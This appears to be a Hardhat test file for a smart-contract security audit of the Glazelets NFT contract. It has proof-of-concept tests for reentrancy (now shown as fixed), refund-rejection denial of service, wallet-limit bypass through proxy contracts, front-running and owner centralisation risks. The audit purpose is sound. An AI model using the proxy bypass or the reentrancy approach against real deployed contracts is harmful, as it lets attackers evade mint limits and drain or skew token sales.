const convert = (amount, decimals) => ethers.utils.parseUnits(amount, decimals);
const { expect } = require("chai");
const { ethers } = require("hardhat");

/**
 * GLAZELETS SECURITY AUDIT - PROOF OF CONCEPT EXPLOITS
 *
 * This file demonstrates vulnerabilities found in the Glazelets contract.
 */

let owner, attacker, user0, user1;
let glazelets;

const MINT_PRICE = convert("0.01", 18);

describe("SECURITY AUDIT - Glazelets Vulnerabilities", function () {

  beforeEach("Deploy fresh contract", async function () {
    [owner, attacker, user0, user1] = await ethers.getSigners();

    const glazeletsArtifact = await ethers.getContractFactory("Glazelets");
    glazelets = await glazeletsArtifact.deploy(MINT_PRICE);
    await glazelets.deployed();
  });

  // ============================================
  // CRITICAL: REENTRANCY VULNERABILITY
  // ============================================
  describe("CRITICAL: Reentrancy Attack on Mint Refund", function () {
    /**
     * VULNERABILITY: The mint() function sends ETH refunds AFTER updating state,
     * but BEFORE the function completes. A malicious contract can re-enter
     * the mint function during the refund callback.
     *
     * Impact: Attacker can mint more than MAX_MINT_PER_WALLET (4) tokens
     * by re-entering during the refund.
     *
     * Location: Glazelets.sol:99-102
     */

    it("FIXED: Reentrancy attack now fails due to nonReentrant modifier", async function () {
      // Deploy malicious reentrancy contract
      const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
      const attackContract = await ReentrancyAttacker.deploy(glazelets.address);
      await attackContract.deployed();

      // Fund the attacker contract
      const attackFunds = convert("1", 18); // 1 ETH
      await attacker.sendTransaction({
        to: attackContract.address,
        value: attackFunds
      });

      // Execute attack - should now revert due to ReentrancyGuard
      await expect(
        attackContract.connect(attacker).attack({ value: convert("0.1", 18) })
      ).to.be.revertedWith("ReentrancyGuard: reentrant call");
    });
  });

  // ============================================
  // HIGH: Denial of Service via Refund Failure
  // ============================================
  describe("HIGH: DoS via Refund Rejection", function () {
    /**
     * VULNERABILITY: If msg.sender is a contract that rejects ETH (no receive/fallback),
     * the refund will fail and revert the entire mint transaction.
     *
     * Impact: Contracts that can't receive ETH cannot mint, even with exact payment.
     * More critically, if there's any dust/rounding, the mint will fail.
     *
     * Location: Glazelets.sol:99-102
     */

    it("POC: Contract that rejects ETH cannot mint with overpayment", async function () {
      const RefundRejecter = await ethers.getContractFactory("RefundRejecter");
      const rejecterContract = await RefundRejecter.deploy(glazelets.address);
      await rejecterContract.deployed();

      // This will fail because the contract can't receive the refund
      await expect(
        rejecterContract.connect(attacker).mintWithOverpayment({ value: convert("0.02", 18) })
      ).to.be.revertedWith("GLZE: Refund failed");
    });
  });

  // ============================================
  // MEDIUM: Wallet Limit Bypass via Contract Deployment
  // ============================================
  describe("MEDIUM: Wallet Limit Bypass via Multiple Contracts", function () {
    /**
     * VULNERABILITY: The per-wallet limit only tracks msg.sender.
     * An attacker can deploy multiple contracts to bypass the 4-token limit.
     *
     * Impact: Single entity can accumulate unlimited tokens despite the limit.
     *
     * Location: Glazelets.sol:27, 81, 96
     */

    it("POC: Deploy multiple contracts to bypass wallet limit", async function () {
      const MintProxy = await ethers.getContractFactory("MintProxy");

      // Deploy 5 proxy contracts and mint 4 from each = 20 tokens
      let totalMinted = 0;
      for (let i = 0; i < 5; i++) {
        const proxy = await MintProxy.deploy(glazelets.address);
        await proxy.deployed();

        // Mint 4 tokens through each proxy
        for (let j = 0; j < 4; j++) {
          await proxy.connect(attacker).mintFor(attacker.address, `origin-${i}-${j}`, {
            value: MINT_PRICE
          });
          totalMinted++;
        }
      }

      // Attacker now owns 20 tokens despite 4-per-wallet limit
      const attackerBalance = await glazelets.balanceOf(attacker.address);
      console.log(`    Attacker accumulated: ${attackerBalance} tokens via proxies`);
      expect(attackerBalance).to.equal(20);
    });
  });

  // ============================================
  // MEDIUM: Front-Running / MEV Risks
  // ============================================
  describe("MEDIUM: Front-Running Vulnerabilities", function () {
    /**
     * VULNERABILITY: setMintPrice can be front-run.
     * If owner submits tx to lower price, MEV bots can sandwich attack.
     *
     * Impact: Users may pay higher price than intended when price is being lowered.
     *
     * Location: Glazelets.sol:50-52
     */

    it("INFO: Price change can be front-run (demonstrated scenario)", async function () {
      // User sees owner's pending tx to lower price from 0.01 to 0.005 ETH
      // User submits mint at 0.01 ETH expecting the lower price
      // MEV bot front-runs to ensure user pays 0.01 ETH

      await glazelets.connect(user0).mint("origin1", { value: MINT_PRICE });

      // Owner lowers price
      const newPrice = convert("0.005", 18);
      await glazelets.connect(owner).setMintPrice(newPrice);

      // User1 pays the new lower price
      await glazelets.connect(user1).mint("origin2", { value: newPrice });

      // This demonstrates the timing issue - transactions in the same block
      // can have different prices depending on ordering
      expect(await glazelets.mintPrice()).to.equal(newPrice);
    });
  });

  // ============================================
  // LOW: Events - NOW FIXED
  // ============================================
  describe("LOW: Events - FIXED", function () {
    /**
     * FIXED: Events are now emitted for important state changes.
     */

    it("FIXED: Glazelets__MintPriceChanged event emitted", async function () {
      const oldPrice = MINT_PRICE;
      const newPrice = convert("0.02", 18);

      await expect(glazelets.connect(owner).setMintPrice(newPrice))
        .to.emit(glazelets, "Glazelets__MintPriceChanged")
        .withArgs(oldPrice, newPrice);
    });

    it("FIXED: Glazelets__BaseURIChanged event emitted", async function () {
      const newURI = "ipfs://QmNewCID/";

      await expect(glazelets.connect(owner).setBaseURI(newURI))
        .to.emit(glazelets, "Glazelets__BaseURIChanged")
        .withArgs(newURI);
    });

    it("FIXED: Glazelets__Withdrawal event emitted", async function () {
      await glazelets.connect(user0).mint("origin1", { value: MINT_PRICE });

      await expect(glazelets.connect(owner).withdraw())
        .to.emit(glazelets, "Glazelets__Withdrawal")
        .withArgs(owner.address, MINT_PRICE);
    });

    it("FIXED: Glazelets__Minted event emitted", async function () {
      await expect(glazelets.connect(user0).mint("test-origin", { value: MINT_PRICE }))
        .to.emit(glazelets, "Glazelets__Minted")
        .withArgs(1, user0.address, "test-origin");
    });
  });

  // ============================================
  // LOW: Centralization Risks
  // ============================================
  describe("LOW: Centralization / Trust Issues", function () {
    /**
     * VULNERABILITY: Owner has significant powers:
     * 1. Can change mint price at any time (including to very high)
     * 2. Can change baseURI (rug pull metadata)
     * 3. Can withdraw all funds
     * 4. Can renounce ownership (inherited from Ownable)
     *
     * Impact: Users must trust the owner completely.
     */

    it("Owner can rug-pull metadata by changing baseURI", async function () {
      await glazelets.connect(owner).setBaseURI("ipfs://QmRealArt/");
      await glazelets.connect(user0).mint("origin1", { value: MINT_PRICE });

      expect(await glazelets.tokenURI(1)).to.equal("ipfs://QmRealArt/1.json");

      // Owner rugs the metadata
      await glazelets.connect(owner).setBaseURI("ipfs://QmScamArt/");

      expect(await glazelets.tokenURI(1)).to.equal("ipfs://QmScamArt/1.json");
    });

    it("Owner can set extremely high mint price", async function () {
      const absurdPrice = convert("1000000", 18); // 1 million ETH
      await glazelets.connect(owner).setMintPrice(absurdPrice);

      await expect(
        glazelets.connect(user0).mint("origin1", { value: MINT_PRICE })
      ).to.be.revertedWith("GLZE: Insufficient ETH sent");
    });

    it("Owner can renounce ownership leaving contract unmanaged", async function () {
      await glazelets.connect(owner).renounceOwnership();

      expect(await glazelets.owner()).to.equal(ethers.constants.AddressZero);

      // Now no one can withdraw funds or update settings
      await expect(
        glazelets.connect(owner).withdraw()
      ).to.be.revertedWith("Ownable: caller is not the owner");
    });
  });

  // ============================================
  // INFO: Gas Optimization Issues
  // ============================================
  describe("INFO: Gas Inefficiencies", function () {
    /**
     * OBSERVATIONS:
     * 1. Using Counters library is more expensive than simple ++
     * 2. String storage for origin is expensive
     * 3. Could use ERC721A for batch minting efficiency
     */

    it("INFO: Measure gas cost of mint", async function () {
      const tx = await glazelets.connect(user0).mint("origin1", { value: MINT_PRICE });
      const receipt = await tx.wait();
      console.log(`    Gas used for single mint: ${receipt.gasUsed.toString()}`);
    });
  });
});
